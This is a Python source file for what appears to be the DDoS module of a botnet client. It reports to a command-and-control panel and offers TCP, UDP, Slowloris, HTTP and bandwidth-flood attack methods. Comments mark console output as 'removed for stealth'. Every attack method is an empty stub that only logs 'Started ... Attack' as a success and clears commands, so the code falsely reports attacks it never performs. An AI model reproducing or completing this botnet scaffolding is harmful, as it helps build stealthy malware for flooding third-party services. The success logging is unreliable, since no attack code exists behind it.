from HTTPSocket import HTTPSocket

class DDOS:
    def __init__(self, panelURL, machineID):
        self.panelURL = panelURL
        self.C = HTTPSocket(self.panelURL, machineID)   # Initiate HTTPSocket Class

    def TCP_attack(self, target_host, thread_number, max_timeout_number):
        try:
            # print("[*] Started TCP Attack") # Removed for stealth
            self.C.Log("Succ", "Started TCP Attack")
            self.C.Send("CleanCommands")            
        except Exception as e:
            # print("[Error In DDOS, TCP_attack() Function]") # Removed for stealth
            # print(f"[Error] : {e}") # Removed for stealth
            self.C.Send("CleanCommands")               
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))  

    def UDP_attack(self, target_host, thread_number, max_timeout_number):
        try:
            # print("[*] Started UDP Attack") # Removed for stealth
            self.C.Log("Succ", "Started UDP Attack")
            self.C.Send("CleanCommands")            
        except Exception as e:
            # print("[Error In DDOS, UDP_attack() Function]") # Removed for stealth
            # print(f"[Error] : {e}") # Removed for stealth
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e)) 
            
    def Slowloris_attack(self, target_host, thread_number, max_timeout_number):
        try:
            # print("[*] Started Slowloris Attack") # Removed for stealth
            self.C.Log("Succ", "Started Slowloris Attack")
            self.C.Send("CleanCommands")            
        except Exception as e:
            # print("[Error In DDOS, Slowloris_attack() Function]") # Removed for stealth
            # print(f"[Error] : {e}") # Removed for stealth
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))  
            
    def ARME_attack(self, target_host, thread_number, max_timeout_number):
        try:
            # print("[*] Started ARME Attack") # Removed for stealth
            self.C.Log("Succ", "Started ARME Attack")
            self.C.Send("CleanCommands")            
        except Exception as e:
            # print("[Error In DDOS, ARME_attack() Function]") # Removed for stealth
            # print(f"[Error] : {e}") # Removed for stealth
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))  

    def PostHTTP_attack(self, target_host, thread_number, max_timeout_number):
        try:
            # print("[*] Started PostHTTP Attack") # Removed for stealth
            self.C.Log("Succ", "Started PostHTTP Attack")
            self.C.Send("CleanCommands")            
        except Exception as e:
            # print("[Error In DDOS, PostHTTP_attack() Function]") # Removed for stealth
            # print(f"[Error] : {e}") # Removed for stealth
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e)) 
            
    def HTTPGet_attack(self, target_host, thread_number, max_timeout_number):
        try:
            # print("[*] Started HTTPGet Attack") # Removed for stealth
            self.C.Log("Succ", "Started HTTPGet Attack")
            self.C.Send("CleanCommands")            
        except Exception as e:
            # print("[Error In DDOS, HTTPGet_attack() Function]") # Removed for stealth
            # print(f"[Error] : {e}") # Removed for stealth
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))     

    def BandwidthFlood_attack(self, target_host, thread_number, max_timeout_number):
        try:
            # print("[*] Started BandwidthFlood Attack") # Removed for stealth
            self.C.Log("Succ", "Started BandwidthFlood Attack")
            self.C.Send("CleanCommands")            
        except Exception as e:
            # print("[Error In DDOS, BandwidthFlood_attack() Function]") # Removed for stealth
            # print(f"[Error] : {e}") # Removed for stealth
            self.C.Send("CleanCommands")
            self.C.Log("Fail", "An unexpected error occurred : " + str(e))